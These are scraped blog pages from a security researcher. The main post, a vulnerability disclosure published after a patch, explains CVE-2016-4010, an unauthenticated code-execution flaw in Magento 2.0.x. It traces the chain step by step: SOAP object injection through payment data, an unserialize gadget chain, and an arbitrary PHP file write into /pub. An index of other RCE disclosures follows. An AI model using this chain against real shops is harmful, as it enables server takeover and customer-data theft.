=== Content from netanelrub.in_aa07990a_20250125_011354.html ===

[Skip to content](#content)
# [0-Days And Life](https://www.netanelrub.in/ "0-Days And Life")

## // @DEBUG: This should never happen

Primary Menu

* [[Home](/)](https://www.netanelrub.in/home/)
* [CVE List](https://www.netanelrub.in/cves-list/)
* [Presentations](https://www.netanelrub.in/presentations/)

# Magento – Unauthenticated Remote Code Execution

Posted on [May 17, 2016May 18, 2016](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/) by [Netanel Rubin](https://www.netanelrub.in/author/na7irub/)

The vulnerability (CVE-2016-4010) allows an attacker to execute PHP code at the vulnerable Magento server unauthenticated. This vulnerability actually consists of many small vulnerabilities, as described further in the blog post.

Magento is an extremely popular eCommerce platform with a 30% share in the eCommerce market.

It is used by major corporations, such as Rosetta Stone, Nike, BevMo and Dyson, and by small online merchants alike. All in all, Magento is used in 250,000 online shops, handling approximately **50 Billion dollars a year**.

These statistics, along with the fact Magento stores almost all customer information, makes it an extremely sensitive target, and the main reason I audited it [once more](http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/).

The vulnerability assumes one of the RPCs (REST or SOAP) is enabled. As both are enabled by default, and one of them is actually required by the system, this assumption will not be a problem in the absolute majority of installations.

In this document I will use the SOAP API, as XML is more readable in this case.

This vulnerability works on both the Community Edition and Enterprise Edition of the system.

I recommend all Magento administrators to update their installations to the [2.0.6 patch](https://magento.com/security/patches/magento-206-security-update).

**Vulnerable Versions**

Magento EE & CE before 2.0.6.

**Technical Description**

**The Good**

Since the [last time](http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/) I audited Magento’s code, a lot has changed. Most of the code has been re-written, the directories structure changed, and the security mechanisms improved.

So, naturally, I was quite happy auditing this massive codebase again.

The first thing I noticed while going through the code was the vast improvement to the system’s OOP structure. Almost every class in the system implemented at least one interface, inherited from a parent class, and used some advanced magic-method, such as ‘*\_\_call()*’ or ‘*\_\_get()*’ to better expose private properties.

Of course, while being a huge step-forward, this extreme example of OOP implementation also complicated things quite a bit – both for me as a researcher, and for Magento developers.

Now, when a developer is writing a new class, it is forced to inherit, or implement, a different class or interface, written by another developer. While this happens quite a lot in the software development world, the security implications of this work-methodology has greatly increased in this particular system – a result of the very dynamic code flow, and, unfortunately, the very dynamic API.

Magento, at its core, is a system built by different “modules”. These so called “modules” are basically different directories containing code for different functionalities the system offers. For example, there’s a module responsible for the payment, one that’s responsible for the virtual cart and one responsible for the customers.

In each module there’s a special directory named “*API*”. This directory contains all the functionality the module exports to other modules. That way the payment module can communicate with the cart module, the customer module with the authorization module, or the shipping module with the sales module, naming a few examples.

The “*API*” directory is made out of different PHP files, each containing one PHP class, responsible for exposing some of the module functionality to the rest of the system. Most of the modules API functionality is restricted to other system controlled modules only, as most of it is sensitive.

But, some of the API calls has also been made accessible to another, more user controlled, module – the notorious Web API.

Magento’s Web API is allowing two different RPCs – a REST RPC, and a SOAP API. Both RPCs provide the same functionality, the only difference between the two is that one is using JSON and the HTTP query string to handle its input, while the other uses XML envelopes.

As both are enabled by default, I will use SOAP API in this document as I find it more understandable.

**The Bad**

Without a doubt in my mind, I can safely say Magento features one of the most comprehensive APIs I have ever seen in a PHP CMS, or really any kind of CMS at all.

In order to expose just part of each module’s API, Magento has provided module developers a convenient way of declaring which parts of their module’s API they want to make accessible to the Web API – the “*webapi.xml*” file.

The *“webapi.xml”* file contains all the classes and methods exposed to the Web API, in a neat, organized, XML structure. Each exposed method also specifies the specific privilege level it requires.

These privileges can range from “anonymous” – allowing anyone (even guests) to access the method, to “self” – allowing access only to registered customers, and to specific, admin-only, privileges, such as the “*Magento\_Backend::admin*” privilege – allowing access only to administrators with capabilities of editing the server configuration values.

While granting module developers a convenient way of communicating between the front-end of the system and its back-end, the Web API, using the “*webapi.xml”* file, also opens another door leading directly into the module’s core.

As we will assume the role of guests in the store, we will only be able to access methods requiring the “*anonymous*” privilege. This will greatly narrow our attack surface, but will remove the requirement for any special preconditions.

Surprisingly, even with “anonymous” privileges we could still use very dynamic input types. I’m not referring to the regular XMLRPC input types alone, such as arrays or base64 decoded strings, I’m also referring to different objects available in the system. For example, the “CustomerRepositoryInterface::save()” API function allows us to use a “CustomerInterface” object in the “$customer” variable, as can be seen in the following prototype:

```

interface CustomerRepositoryInterface
{
    /**
     * Create customer.
     */
    public function save(\Magento\Customer\Api\Data\CustomerInterface $customer);

}

```

How can objects be created using the RPC interface? Interestingly enough, the answer to that question relies in how Magento configured their SOAP server.

Magento uses the default SOAP server that is bundled by default with PHP – “SoapServer”. In order to be properly configured, “SoapServer” requires a WSDL file, which describes all the methods, arguments, and custom types used in the particular RPC request.

Magento generates a different WSDL file for every module supporting XMLRPC functionality, setting its data directly from the module’s “webapi.xml” file.

When an RPC request is parsed by the server, the server uses the data found in the WSDL file to decide whether the request is valid or not, checking the requested method, its arguments, and their types. If the request is valid, it passes the parsed request object back to Magento for further parsing.

It is important to note that “SoapServer” does not interact with Magento in any way – all the information it has about the module’s methods and arguments comes from the WSDL file alone.

At this point, the request sent is still made out of nested arrays – no objects were created during SoapServer’s parsing phase.

In order to create the required objects, Magento continues to handle the input itself.

Magento obtains the prototype (can be seen in the previous code example) of the method requested in order to extract its argument names and data types.

For basic cases, such as strings, arrays, booleans and so on, the system just casts the input into the appropriate type. But for objects, the solution is a bit trickier.

If the argument data type is an instance of a class, Magento will try and create that instance using the supplied input. Remember that at this point the input is just a dictionary – its keys are the properties names and values are the properties values.

First, Magneto will create a new instance of the required class. Then, it will try and populate it using the following algorithm:

1. Get a property name (from the input dictionary keys)
2. Look for a public method named “Set[NAME]()”, where [NAME] is the property name
3. If there is such a method, execute it using the property value as an argument.
4. If there isn’t, ignore the property and continue to the next one

Magento will follow this algorithm for every potential property the user is trying to set. When all properties have been checked, Magento will assume the instance is ready and it will move to the next argument.

When all arguments are dealt with, Magento will then finally execute the API method.

Let me clarify that part – Magento lets you create an object, set its public properties, and execute any method starting with the “Set” prefix through its RPC.

Surprisingly, this behavior will be Magento’s downfall.

**The ugly**

Some API calls allow us to set specific information in our shopping cart. Such information can be our shipping address, products, and even our payment method.

When Magento sets our information safely inside the shopping cart instance, it uses the “save” function of that instance in order to store the newly inserted data in the database.

Let’s have a look at how the “save” function looks like:

```

/**
 * Save object data
 */
public function save(\Magento\Framework\Model\AbstractModel $object)
{
    ...
    // If the object is valid and can be saved
    if ($object->isSaveAllowed()) {
        // Serialize whatever fields need serializing
        $this->_serializeFields($object);
        ...
        // If the object already exists in the DB, update it
        if ($this->isObjectNotNew($object)) {
            $this->updateObject($object);
        // Otherwise, create a new record
        } else {
            $this->saveNewObject($object);
        }

        // Unserialize the fields we serialized
        $this->unserializeFields($object);
    }
    ...
    return $this;
}

// AbstractDb::save()

```

Magento makes sure our object is valid, serializes any fields that should be serialized, stores it in the database, and finally it unserializes the fields it previously serialized.

Sounds simple, right?

Nope.

Let’s have a look at how Magento decides which fields it should **serialize**:

```

/**
 * Serialize serializable fields of the object
 */
protected function _serializeFields(\Magento\Framework\Model\AbstractModel $object)
{
    // Loops through the '_serializableFields' property
    // (containing hardcoded fields that should be serialized)
    foreach ($this->_serializableFields as $field => $parameters) {
        // Get the field's value
        $value = $object->getData($field);

        // If it's an array or an object, serialize it
        if (is_array($value) || is_object($value)) {
            $object->setData($field, serialize($value));
        }
    }
}

// AbstractDb::_serializeFields()

```

As can be seen, only fields appearing in the hard-coded dictionary “\_serializableFields” can be serialized. On top of that, the method makes sure the field’s value is an array or an object before it continues to serialize it.

Now, let’s have a look at how Magento decided which fields it should **unserialize**:

```

/**
 * Unserialize serializeable object fields
 */
public function unserializeFields(\Magento\Framework\Model\AbstractModel $object)
{
    // Loops through the '_serializableFields' property
    // (containing hardcoded fields that should be serialized)
    foreach ($this->_serializableFields as $field => $parameters) {
        // Get the field's value
        $value = $object->getData($field);

        // If it's not an array or an object, unserialize it
        if (!is_array($value) && !is_object($value)) {
            $object->setData($field, unserialize($value));
        }
    }
}

// AbstractDb::unserializeFields ()

```

Well, it’s pretty much the same. The only difference is that this time Magento makes sure the field’s value is **not** an array or an object.

Because of these two checks, we can exploit an object injection attack – simply by setting a regular string to a serializable field.

When we set a regular string to a serializable field, the system will not serialize it before the object is stored in the database, as it is **not** an object or an array. But when the system will try to unserialize it, right after the database queries has been executed, it **will** be unserialized, as it is **not** an object or an array.

This small, almost invisible, condition, makes the difference between a vulnerable and a secure system.

The only questions remaining are which fields are considered “serializable”, and how can we set them.

The first question is easy – we just need to search which classes define the “\_serializableFields” property.

Quickly enough, I found several classes that define serializable fields, but none of them could be created using our beloved XMLRPC.

To be honest, one of these classes – “Payment” (which is responsible for gathering information about the payment details), does appear in one of the API methods, but not as an argument, so I couldn’t create or control its instance properties.

On top of that, its serializable field – “additional\_information”, can only be set as an array using the regular “Set[PROPERTY\_NAME]” technique as an extra security measure, so not only we can’t create it, we wouldn’t be able to set it as a string even if we could.

But it can be set in another tricky way.

When Magento sets the properties of the argument instance, it doesn’t actually set its properties. Instead, it stores them in a dictionary named “\_data”. This dictionary is then being used in almost all cases where an instance property is needed.

In our case, this means that our serializable field – “additional\_information”, is actually being stored inside that dictionary rather than as a regular property.

As a result, if we could control the “\_data” dictionary entirely, we could bypass the “additional\_information” field array restriction, as we will set it manually rather than call “Set[PROPERTY\_NAME]”.

But how can we control this sensitive dictionary?

Well, one of the things Magento does before saving our “Payment” instance is to edit its properties. Magento does that by treating our API input as payment information that is needed to be stored in the “Payment” instance. This can be seen in the following API method:

```

/**
 * Adds a specified payment method to a specified shopping cart.
 */
public function set($cartId, \Magento\Quote\Api\Data\PaymentInterface $method)
{

    $quote = $this->quoteRepository->get($cartId); // Get the cart instance
    $payment = $quote->getPayment(); // Get the payment instance

    // Get the data from the user input
    $data = $method->getData();

    // Check for additional data
    if (isset($data['additional_data'])) {
        $data = array_merge($data, (array)$data['additional_data']);
        unset($data['additional_data']);
    }

    // Import the user input to the Payment instance
    $payment->importData($data);

    ...
}

// PaymentMethodManagement::set()

```

As can be seen, the “Payment” data is retrieved with a call to “$method->getData()”, which returns the “\_data” property from the “$method” variable. Keep in mind that because “$method” is an argument in an API method, we are in control of it.

When Magneto calls “getData()” on our “$method” argument, the “\_data” property of that argument is returned, containing all the payment information we inserted.

Later, it calls “importData()” with our “\_data” property as input, replacing the “Payment” instance “\_data” property with our “\_data” property.

This is a huge step forward. We can now replace the sensitive “\_data” property in the “Payment” instance with our user controlled “\_data” property, which means we can now set the “additional\_information” field.

The problem is that for our unserialize() to work we need that field set to a string, but the “Set[PROPERT\_NAME]” method only allows it to be an array.

Surprisingly, though, the solution lies two lines of code before the “importData()” call.

Magento, in its constant effort of becoming the most dynamic CMS ever created, allows developers to add their own payment methods, requiring their own data and information. In order to do that, Magento uses our user-controlled “additional\_data” field.

The “additional\_data” field is a dictionary containing more data for the payment method, completely controlled by the user. In order for that custom data to be part of the original data, **Magento merges the “additional\_data” dictionary with the original “data” dictionary**, effectively allowing the “additional\_data” dictionary to override any value in the “data” dictionary, basically letting it completely override it.

This means that now, after the two dictionaries merged, the user controlled “additional\_data” dictionary now became the argument’s “\_data” dictionary, and because of “importData()”, **it now becomes the “Payment” instance sensitive “\_data” property**.

Which means we can now completely control the serializable field “additional\_information” and **exploit an Object Injection Attack**.

**And the unserializable**

Now, that we can unserialize any string we wanted, it’s time to exploit the Object Injection.

First, we will need an object with a “\_\_wakeup()” or “\_\_destruct()” method, so it will be automatically called when the object is unserialized or destroyed. We require such methods because even though we can control the object properties, we can’t call any of its methods. This is why we have to rely on PHP’s magical methods, which are called automatically when certain events occur.

The first object we will use will be an instance of the “Credis\_Client” class, which contains these methods:

```

/*
 * Called automaticlly when the object is destrotyed.
 */
public function __destruct()
{
    if ($this->closeOnDestruct) {
        $this->close();
    }
}

/*
 * Closes the redis stream.
 */
public function close()
{
    if ($this->connected && ! $this->persistent) {
            ...
            $result = $this->redis->close();
    }
    ...
}

// Credis_Client::__destruct(), close()

```

As can be seen, the class does have a simple \_\_”destruct()” method (that will be automatically called by PHP when the object is destroyed), which simply calls the “close()” method.

“close()”, on the other hand, is more interesting – if “close()” recognizes that there is an active connection to a Redis server, it tries to close it by calling the “close()” method on the “redis” property.

Because “unserialize()” allows us to control all the object properties, we control the “redis” property too. Because of that, we can set any object we’d like into that property (not just a Redis one), and affectively, call any “close()” method in any class in the system.

This greatly expands our attack surface. There are several “close()” methods in Magento, and because “close()” methods are usually responsible for terminating streams, closing file handles, and storing object data, we can expect some interesting calls in some of them.

And, as expected, I did find some interesting calls. Let’s have a look at the “close()” method of the “Transaction” class:

```

/**
 * Close this transaction
 */
public function close($shouldSave = true)
{
    ...
    if ($shouldSave) {
        $this->save();
    }
    ...
}

/**
 * Save object data
 */
public function save()
{
    $this->_getResource()->save($this);
    return $this;
}

// Magento\Sales\Model\Order\Payment\Transaction::__destruct(), close()

```

Both of these methods are pretty simple. The “close()” method calls the “save()” method, which then calls the “save()” method of the “\_resource” property.

Using the same logic we used before, because we control the “\_resource” property we can control its class too, so we can call any “save()” method in any class we’d like.

That’s a huge step forward. As can be guessed, “save()” methods are usually responsible for storing some kind of data in some kind of storage – the file system, a database, and so on. All we have to do now is look for a “save()” method which uses the file system as its storage utility.

And, quickly enough, I found one:

```

/**
 * Try to save configuration cache to file
 */
public function save()
{
    ...
    // save stats
    file_put_contents($this->getStatFileName(), $this->getComponents());
    ...
}

// Magento\Framework\Simplexml\Config\Cache\File::save()

```

All this method does is store what’s inside the “components” field into a file. As the file path is retrieved from the “stat\_file\_name” field, and because we control these two fields, we effectively control both the file path and its content, **which results in an arbitrary file write vulnerability**.

All we have to do now is find a good path to write our file in, one that has to be writeable by the server and accessible via the web.

One such path is the “/pub” directory, available in all Magento installations. Magento uses that directory in order to store any images or public files an administrator uploaded, and as such, it has to be writeable by the server.

More importantly, because that directory usually stores images, which needs to be retrieved by the browser, it is accessible through the regular web interface.

Finally, we just need to write some PHP code, give our file name a “.php” extension, and we’re good to go. **We’ve executed arbitrary PHP code on the server unauthenticated.**

### Share!

* [Click to share on Twitter (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=twitter "Click to share on Twitter")
* [Click to share on Facebook (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=facebook "Click to share on Facebook")
* [Click to share on Google+ (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=google-plus-1 "Click to share on Google+")
* [Click to share on Reddit (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=reddit "Click to share on Reddit")
* [Click to share on LinkedIn (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=linkedin "Click to share on LinkedIn")

### *Related*

Posted in [0-Days](https://www.netanelrub.in/category/0-days/), [Magento](https://www.netanelrub.in/category/magento/), [PHP](https://www.netanelrub.in/category/php/), [RCE](https://www.netanelrub.in/category/rce/)

## Post navigation

[TWiki – Arbitrary File Upload (Windows)](https://www.netanelrub.in/2016/04/29/twiki-arbitrary-file-upload-windows/)[Magento – Re-Installation & Account Hijacking Vulnerabilities](https://www.netanelrub.in/2016/07/01/magento-re-installation-account-hijacking-vulnerabilities/)

## 34 thoughts on “Magento – Unauthenticated Remote Code Execution”

1. Pingback: [Magento – Unauthenticated Remote Code Execution – sec.uno](https://www.sec.uno/2016/05/17/magento-unauthenticated-remote-code-execution/)
3. Pingback: [5月18日-每日安全知识热点 – News Republic of World](http://news.securemymind.com/2016051831973.html)
5. Pingback: [Magento attacks uncanny hacks-men with shopper-popper patch (The Register) – sec.uno](https://www.sec.uno/2016/05/18/magento-attacks-uncanny-hacks-men-with-shopper-popper-patch-the-register/)
7. ![](https://secure.gravatar.com/avatar/68c28ddcb1263e09482439dc295b4769?s=32&d=retro&r=g) **naltor** says:
   [May 18, 2016 at 11:13 am](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-7)

   Awesome man!!!

   Just a question, does this vulnerabilities affect to Magento v1.x ?

   Regards

   [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=7#respond)
   1. ![](https://secure.gravatar.com/avatar/b58996c504c5638798eb6b511e6f49af?s=32&d=retro&r=g) **[Netanel Rubin](http://netanelrub.in/)** says:
      [May 18, 2016 at 11:16 am](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-8)

      I believe not.

      [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=8#respond)
   3. ![](https://secure.gravatar.com/avatar/c3895b6b499c0775bd05df002c42d7cd?s=32&d=retro&r=g) **therochworks** says:
      [July 25, 2016 at 10:57 am](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-171)

      The attack vector described by Netanel is not useable in Magento 1.x.

      [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=171#respond)
9. Pingback: [CVE-2016-4010 -A critical bug can fully compromise a Magento shopSecurity Affairs](http://securityaffairs.co/wordpress/47439/hacking/cve-2016-4010-magento-flaw.html)
11. Pingback: [CVE-2016-4010 – Watch out a critical bug can fully compromise your Magento shop – sec.uno](https://www.sec.uno/2016/05/18/cve-2016-4010-watch-out-a-critical-bug-can-fully-compromise-your-magento-shop/)
13. Pingback: [CVE-2016-4010 – Watch out a critical bug can fully compromise your Magento shop - Systerity](http://systerity.com/blog/cve-2016-4010-watch-out-a-critical-bug-can-fully-compromise-your-magento-shop/)
15. ![](https://secure.gravatar.com/avatar/fc541fdb90c5cc047c8ab5b3723af0fe?s=32&d=retro&r=g) **AC** says:
    [May 18, 2016 at 3:16 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-12)

    Awesome! Nice detailed explanation.

    [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=12#respond)
17. ![](https://secure.gravatar.com/avatar/a420fff8b08c42444526b097eb657d27?s=32&d=retro&r=g) **Daniel Z** says:
    [May 18, 2016 at 8:39 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-14)

    you are a really smart guy

    [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=14#respond)
19. Pingback: [Magento ออก Patch 2.0.6 อุดช่องโหว่ความรุนแรงระดับสูง เตือนผู้ใช้งานทำการ Patch โดยด่วน – TechTalkThai](https://www.techtalkthai.com/magento-releases-critical-remote-code-execution-patch-2-0-6/)
21. Pingback: [60 miliardów dolarów, Magento i nieuwierzytelnione wykonanie kodu w popularnej platformie e-commerce](http://sekurak.pl/60-miliardow-dolarow-magento-i-nieuwierzytelnione-wykonanie-kodu-w-popularnej-platformie-e-commerce/)
23. Pingback: [CVE-2016-4010 – Watch out a critical bug can fully compromise your Magento shop - OSINT](http://opensources.info/cve-2016-4010-watch-out-a-critical-bug-can-fully-compromise-your-magento-shop/)
25. Pingback: [Achtung Magento-Nutzer: Patch 2.0.6 einspielen | goneo Blog -Infos zu Hosting, Server, Software](http://intern.goneoblog.de/2016/05/19/achtung-magento-nutzer-patch-2-0-6-einspielen/)
27. Pingback: [Magento flaw allowed hackers to execute code using APIs | hacker samurai](http://hackersamurai.com/magento-flaw-allowed-hackers-to-execute-code-using-apis/)
29. Pingback: [Federal Procurement Regs Adopt Simple Security Controls (May 16, 2016) (SANS Newsbites) – sec.uno](https://www.sec.uno/2016/05/20/federal-procurement-regs-adopt-simple-security-controls-may-16-2016-sans-newsbites/)
31. Pingback: [Weekendowa Lektura 2016-05-20 – bierzcie i czytajcie | Zaufana Trzecia Strona](https://zaufanatrzeciastrona.pl/post/weekendowa-lektura-2016-05-20-bierzcie-i-czytajcie/)
33. Pingback: [Magento2 – 能够完全控制网店的漏洞 | 神刀安全网](http://www.shellsec.com/news/21121.html)
35. ![](https://secure.gravatar.com/avatar/f567cde58798a3b5e3efd74285e4b531?s=32&d=retro&r=g) **Brian** says:
    [May 22, 2016 at 6:41 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-39)

    Thanks for the sharing. I just tried to reproduce this vuln but I failed. The below is my testings:

    1. Magento 1.9

    2. Magento 1.8

    3. Magento 1.7

    4. Magento 2 (<https://github.com/magento/magento2/tree/develop>)

    Could you please tell me which version is vulnerable? Really appreciate that.

    Thanks,

    [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=39#respond)
    1. ![](https://secure.gravatar.com/avatar/99cb247fbda26925ea2593a87bcc61b0?s=32&d=retro&r=g) **[Netanel Rubin](http://netanelrub.in/)** says:
       [May 22, 2016 at 6:45 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-40)

       As mentioned above, the vulnerable versions are 2.0.0 – 2.0.5 (included).

       [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=40#respond)
       1. ![](https://secure.gravatar.com/avatar/21264e5f7cc6b591b250438fcd85bb4b?s=32&d=retro&r=g) **[Daniel](http://decrypted.de)** says:
          [May 24, 2016 at 2:47 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-46)

          Hey,

          you never mentioned before that it really is only 2.x, also reporting about that very important detail was and is very bad.

          Even <https://magento.com/security/patches/magento-206-security-update> is not 100% clear on the matter with sayings like everything below 2.0.6.

          Thx for your efforts! Maybe thats a really interesting talking point to get right for a next time.

          [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=46#respond)
37. Pingback: [Magento未授权远程代码执行漏洞(CVE-2016-4010)的分析与利用 | 安全小飞侠的窝](http://avfisher.win/archives/529)
39. Pingback: [Magento 2.0.5 Remote Code Execution (RCE) - Byte Blog](https://www.byte.nl/blog/magento-2-0-5-remote-code-execution-rce)
41. Pingback: [Magento 2.0.6 Unserialize Remote Code Execution | LoneRanger](https://lonerangerweb.wordpress.com/2016/06/06/magento-2-0-6-unserialize-remote-code-execution/)
43. Pingback: [Inside Out Security Show Episode #9](https://blog.varonis.com/inside-out-security-show-episode-nine/)
45. Pingback: [Check Point discovers three Zero-Day Vulnerabilities in web programming language PHP 7 | Check Point Blog](http://blog.checkpoint.com/2016/12/27/check-point-discovers-three-zero-day-vulnerabilities-web-programming-language-php-7/)
47. Pingback: [[Alert] New Magento Vulnerability – Unauthenticated Remote Code Execution | Information Security, latest Hacking News, Cyber Security, Network Security](https://www.securityglobal24h.com/alert-new-magento-vulnerability-unauthenticated-remote-code-execution/general/news/Information-Security-latest-Hacking-News-Cyber-Security-Network-Security)
49. Pingback: [Magento flaw allowed hackers to execute code using APIs | SC Media](https://www.scmagazine.com/home/news/magento-flaw-allowed-hackers-to-execute-code-using-apis/)
51. Pingback: [[Alert] Tính dễ bị tổn thương Magento mới – Thực thi mã từ xa không được xác thực | Top - Tin tức an ninh mạng nhanh nhất Việt Nam](http://anninhmang24h.com/alert-tinh-de-bi-ton-thuong-magento-moi-thuc-thi-ma-tu-xa-khong-duoc-xac-thuc/)
53. Pingback: [Critical SQL Injection & RCE Vulnerabilities Discovered in Magento - Fixed](https://www.getastra.com/blog/cms/magento-security/magento-sqli-vulnerability-disclosed-in-versions-2-1-2-2-2-3/)
55. Pingback: [Magento CMS 2.20 前台SQLI - 黑客圈](https://www.hackquan.com/article/hacker-technology/2350.html)
57. ![](https://secure.gravatar.com/avatar/877da7df00dea8b65322f7de030b6277?s=32&d=retro&r=g) **Awist** says:
    [August 11, 2020 at 5:07 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-82386)

    you are a really smart guy

    [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=82386#respond)
59. Pingback: [[Alert] New Magento Vulnerability - Unauthenticated Distant Code Execution - Hostor Infotech %](http://hostor.xyz/alert-new-magento-vulnerability-unauthenticated-distant-code-execution/)

### Leave a Reply [Cancel reply](/2016/05/17/magento-unauthenticated-remote-code-execution/#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name \*

Email \*

Website

Save my name, email, and website in this browser for the next time I comment.

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

Search for:

# Follow Me

* [View @na7irub’s profile on Twitter](https://twitter.com/%40na7irub/)
* [View na7irub’s profile on LinkedIn](https://www.linkedin.com/in/na7irub/)
# Categories

* [0-Days](https://www.netanelrub.in/category/0-days/)
* [ACS](https://www.netanelrub.in/category/acs/)
* [Magento](https://www.netanelrub.in/category/magento/)
* [MediaWiki](https://www.netanelrub.in/category/mediawiki/)
* [Moodle](https://www.netanelrub.in/category/moodle/)
* [Node.JS](https://www.netanelrub.in/category/node-js/)
* [Perl](https://www.netanelrub.in/category/perl/)
* [PHP](https://www.netanelrub.in/category/php/)
* [RCE](https://www.netanelrub.in/category/rce/)
* [TWiki](https://www.netanelrub.in/category/twiki/)

[Proudly powered by WordPress](http://wordpress.org/)
 |
Theme: sosimple by [Fernando Villamor Jr.](http://fernandovillamorjr.com).



=== Content from www.netanelrub.in_9d02d301_20250126_045953.html ===

[Skip to content](#content)
# [0-Days And Life](https://www.netanelrub.in/ "0-Days And Life")

## // @DEBUG: This should never happen

Primary Menu

* [[Home](/)](https://www.netanelrub.in/home/)
* [CVE List](https://www.netanelrub.in/cves-list/)
* [Presentations](https://www.netanelrub.in/presentations/)

# Author: Netanel Rubin

# [Moodle – Remote Code Execution](https://www.netanelrub.in/2017/03/20/moodle-remote-code-execution/)

Posted on [March 20, 2017March 22, 2017](https://www.netanelrub.in/2017/03/20/moodle-remote-code-execution/) by [Netanel Rubin](https://www.netanelrub.in/author/na7irub/)

The vulnerability (CVE-2017-2641) allows an attacker to execute PHP code at the vulnerable Moodle server. This vulnerability actually consists of many small vulnerabilities, as described further in the blog post. Moodle is a very popular learning management system, deployed in many universities around the world, including top institutes such as MIT, Stanford, the University of Cambridge, […]

Posted in [0-Days](https://www.netanelrub.in/category/0-days/), [Moodle](https://www.netanelrub.in/category/moodle/), [PHP](https://www.netanelrub.in/category/php/), [RCE](https://www.netanelrub.in/category/rce/) [51 Comments](https://www.netanelrub.in/2017/03/20/moodle-remote-code-execution/#comments)

# [Magento – Re-Installation & Account Hijacking Vulnerabilities](https://www.netanelrub.in/2016/07/01/magento-re-installation-account-hijacking-vulnerabilities/)

Posted on [July 1, 2016July 3, 2016](https://www.netanelrub.in/2016/07/01/magento-re-installation-account-hijacking-vulnerabilities/) by [Netanel Rubin](https://www.netanelrub.in/author/na7irub/)

Before discovering my latest Magento RCE, I’ve found two different vulnerabilities, both resulting in the complete compromise of customer data and/or the server. As they are far less complicated, I’m presenting both of them in this single blog post for your convenience.

Posted in [0-Days](https://www.netanelrub.in/category/0-days/), [Magento](https://www.netanelrub.in/category/magento/), [PHP](https://www.netanelrub.in/category/php/) [2 Comments](https://www.netanelrub.in/2016/07/01/magento-re-installation-account-hijacking-vulnerabilities/#comments)

# [Magento – Unauthenticated Remote Code Execution](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/)

Posted on [May 17, 2016May 18, 2016](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/) by [Netanel Rubin](https://www.netanelrub.in/author/na7irub/)

The vulnerability (CVE-2016-4010) allows an attacker to execute PHP code at the vulnerable Magento server unauthenticated. This vulnerability actually consists of many small vulnerabilities, as described further in the blog post. Magento is an extremely popular eCommerce platform with a 30% share in the eCommerce market. It is used by major corporations, such as Rosetta Stone, […]

Posted in [0-Days](https://www.netanelrub.in/category/0-days/), [Magento](https://www.netanelrub.in/category/magento/), [PHP](https://www.netanelrub.in/category/php/), [RCE](https://www.netanelrub.in/category/rce/) [34 Comments](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comments)

# [TWiki – Arbitrary File Upload (Windows)](https://www.netanelrub.in/2016/04/29/twiki-arbitrary-file-upload-windows/)

Posted on [April 29, 2016April 29, 2016](https://www.netanelrub.in/2016/04/29/twiki-arbitrary-file-upload-windows/) by [Netanel Rubin](https://www.netanelrub.in/author/na7irub/)

The vulnerability (CVE-2014-7237) allows an attacker to execute arbitrary system code on any TWiki installed on a Windows based server, with the only requirement of being able to upload files to the system (Enabled by default). TWiki is an open-source web platform used to create and maintain wikis. It allows its users to upload files into the […]

Posted in [0-Days](https://www.netanelrub.in/category/0-days/), [Perl](https://www.netanelrub.in/category/perl/), [RCE](https://www.netanelrub.in/category/rce/), [TWiki](https://www.netanelrub.in/category/twiki/)[Leave a comment](https://www.netanelrub.in/2016/04/29/twiki-arbitrary-file-upload-windows/#respond)

# [GenieACS – Unauthenticated Remote Code Execution](https://www.netanelrub.in/2016/04/20/genieacs-unauthenticated-remote-code-execution/)

Posted on [April 20, 2016April 25, 2016](https://www.netanelrub.in/2016/04/20/genieacs-unauthenticated-remote-code-execution/) by [Netanel Rubin](https://www.netanelrub.in/author/na7irub/)

The vulnerability (CVE-2014-4956) allows an attacker to execute JS code (the system utilizes Node.js) at a vulnerable GenieACS server, resulting in complete server compromise. GenieACS is an open sourced implementation of an ACS (Auto Configuration Server) written in Node.js. It is popular in the ISP industry as a convenient way of cheaply implementing the TR-069 protocol.

Posted in [0-Days](https://www.netanelrub.in/category/0-days/), [ACS](https://www.netanelrub.in/category/acs/), [Node.JS](https://www.netanelrub.in/category/node-js/), [RCE](https://www.netanelrub.in/category/rce/)[Leave a comment](https://www.netanelrub.in/2016/04/20/genieacs-unauthenticated-remote-code-execution/#respond)

# [MediaWiki (wikipedia.org) – Unauthenticated Remote Code Execution](https://www.netanelrub.in/2016/04/14/mediawiki-unauthenticated-rce/)

